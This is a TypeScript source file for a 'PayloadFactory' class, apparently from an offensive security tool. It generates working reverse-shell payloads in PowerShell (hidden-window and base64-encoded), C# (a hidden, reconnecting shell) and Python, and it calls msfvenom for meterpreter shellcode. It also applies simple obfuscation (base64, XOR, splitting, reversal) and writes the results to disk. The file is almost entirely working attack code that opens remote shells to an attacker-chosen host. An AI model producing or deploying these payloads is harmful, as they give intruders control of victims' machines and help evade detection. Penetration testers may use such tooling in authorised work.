/**
 * Payload Factory — generate, obfuscate, and save payloads
 */

import * as fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';

export class PayloadFactory {
  private dataDir: string;

  constructor(userDataPath: string) {
    this.dataDir = path.join(userDataPath, 'payloads');
    if (!fs.existsSync(this.dataDir)) {
      fs.mkdirSync(this.dataDir, { recursive: true });
    }
  }

  /**
   * Generate a PowerShell one-liner reverse shell
   */
  generatePs1(lhost: string, lport: number, kind: string): string {
    const base = `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

    if (kind === 'powershell_encoded') {
      const b64 = Buffer.from(base, 'utf-16le').toString('base64');
      return `powershell -NoP -NonI -W Hidden -Enc ${b64}`;
    }
    return `powershell -NoP -NonI -W Hidden -E ${Buffer.from(base, 'utf-16le').toString('base64')}`;
  }

  /**
   * Generate C# reverse shell stub
   */
  generateCsharp(lhost: string, lport: number): string {
    return `using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;

class Program {
  static void Main() {
    while (true) {
      try {
        using (var client = new TcpClient("${lhost}", ${lport}))
        using (var stream = client.GetStream()) {
          var bytes = new byte[4096];
          while (true) {
            int i = stream.Read(bytes, 0, bytes.Length);
            string data = Encoding.ASCII.GetString(bytes, 0, i);
            var psi = new ProcessStartInfo("powershell", "-NoP -NonI -W Hidden \\"" + data + "\\"") {
              UseShellExecute = false,
              RedirectStandardOutput = true,
              CreateNoWindow = true
            };
            using (var p = Process.Start(psi)) {
              p.WaitForExit();
              var output = p.StandardOutput.ReadToEnd();
              var response = Encoding.ASCII.GetBytes(output + "PS> ");
              stream.Write(response, 0, response.Length);
            }
          }
        }
      } catch { }
      System.Threading.Thread.Sleep(5000);
    }
  }
}`;
  }

  /**
   * Generate Python reverse shell one-liner
   */
  generatePython(lhost: string, lport: number): string {
    return `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);`;
  }

  /**
   * Generate shellcode payload via MSF (if available) or return a placeholder
   */
  generateShellcode(lhost: string, lport: number, arch: string): string {
    // Try to use msfvenom if available
    try {
      const archFlag = arch === 'x64' ? 'x64' : 'x86';
      const platform = 'windows';
      const result = execSync(
        `msfvenom -p windows/${archFlag}/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f base64 2>/dev/null`,
        { timeout: 15000, encoding: 'utf-8' }
      );
      return result.trim();
    } catch {
      // Fallback: return a placeholder with msfvenom command
      return `# Run locally to generate shellcode:\nmsfvenom -p windows/${arch === 'x64' ? 'x64/' : ''}meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f c\n\n# Or use base64 format:\nmsfvenom -p windows/${arch === 'x64' ? 'x64/' : ''}meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f base64`;
    }
  }

  /**
   * Simple obfuscation
   */
  obfuscate(payload: string, method: string): string {
    switch (method) {
      case 'base64':
        return Buffer.from(payload, 'utf-8').toString('base64');
      case 'xor':
        return payload.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x5A)).join('');
      case 'split':
        const mid = Math.ceil(payload.length / 2);
        return `$a = "${payload.slice(0, mid)}"; $b = "${payload.slice(mid)}"; $a + $b`;
      case 'reverse':
        return payload.split('').reverse().join('');
      default:
        return payload;
    }
  }

  /**
   * Save payload to disk
   */
  save(payload: string, filename: string): { success: boolean; filePath?: string } {
    try {
      const filePath = path.join(this.dataDir, filename);
      fs.writeFileSync(filePath, payload, 'utf-8');
      return { success: true, filePath };
    } catch (err: any) {
      return { success: false };
    }
  }
}
